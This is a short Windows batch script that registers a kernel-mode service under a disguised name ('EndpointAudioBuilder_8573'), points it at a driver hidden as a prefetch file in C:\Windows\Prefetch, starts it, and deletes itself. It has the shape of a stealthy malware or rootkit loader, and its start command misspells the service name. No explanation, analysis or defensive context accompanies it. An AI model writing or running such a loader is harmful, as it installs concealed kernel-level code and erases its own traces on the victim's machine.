@echo off
cd %~dp0
sc create EndpointAudioBuilder_8573 binpath=C:\Windows\Prefetch\DLLHOST.EXE-75GJ3V29.pf type=kernel
sc start ndpointAudioBuilder_8573
del "%~f0"



